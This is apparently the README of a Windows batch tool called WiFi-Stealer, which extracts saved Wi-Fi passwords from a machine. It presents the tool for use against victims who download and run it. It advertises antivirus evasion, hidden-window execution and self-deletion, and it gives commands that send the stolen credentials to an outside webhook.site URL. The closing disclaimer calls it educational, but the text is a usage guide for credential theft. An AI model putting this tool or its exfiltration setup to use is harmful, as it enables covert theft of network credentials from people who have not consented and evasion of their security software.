## About
This is a simple batch program to grab Wi-Fi credentials from a local Windows machine.


## Features
- It does not need to be compiled.
- Runs on any windows machine (7/8.1/10/11).
- Undetectable by the default Windows Security AV (didn't test other AVs, but it should be also undetectable by them).
- Exfiltrated cedentials can be sent to a [webhook](https://webhook.site/) or saved locally to a txt file.
- The program has the ability to self-delete.
- To avoid problems caused by specials characters, the credentials are also stored in a hexadecimal value (in the form `name:password`).

**Note**: When using [Webhook.site](https://webhook.site/), please take the expiration of the URLs into consideration.


## Usage
There is a wide variety of ways to run the program. You can choose to use it in whatever way suits your needs. But usually, you either run this program on your machine or on a target machine. Here are some examples on how you can use the program:

### Running the program on a local machine (yours)
To run the script and save the credentials in the default `txt` file (this code line sets the default text file: `set "credsfile=creds.txt"`.), simply type:

```batch
> WiFi-Stealer.bat
```

Or you can specify a name for the `txt` file (or any file type), type this:

```batch
> WiFi-Stealer.bat --output "wifi-credentials.txt"
```

### Running the program on the target machine
Usually when running the program of a remote machine (program downloaded and executed by the victim) or a machine that you gained phisical access to, you need a way to retrieve the credentials. This is how you do it:

- **Specify the webhook as an argument**: Simply run the program and pass the URL of your webhook as an argument:

```batch
> WiFi-Stealer.bat --upload "https://webhook.site/#!/87258b74-93c5-4792-8175-df08c3ffee20"
```

- **Store the webhook inside the program**: If you can't run the program from the command prompt or to avoid typing the url, ensure to save your webhook's URL in the variable `webhook` within the program. Another important step is to change the value of the `upload` variable from `0` to `1`. Once the program is executed, you will receive the credentials.

```batch
set upload=0

set "webhook=https://webhook.site/#!/87258b74-93c5-4792-8175-df08c3ffee20"
```

- Another cool feature is to make the program delete itself when it's done. To do this, you can simply change `selfdelete` varibale inside the program from `0` to `1`.

- To run the program in stealth (hidden) mode, remove the `::` form this line in the program:

```batch
::@powershell -window Hidden -command ""   &:: Uncomment if you want to run the program in hidden mode
```


## Screenshots

![](https://raw.githubusercontent.com/Psi505/WiFi-Stealer/main/Screenshot_1.png)

![](https://raw.githubusercontent.com/Psi505/WiFi-Stealer/main/Screenshot_2.png)


## ⚠️ DISCLAIMER
This project can only be used for educational purposes. Using this software against target systems without prior permission is illegal, and any damages from misuse of this software will not be the responsibility of the author.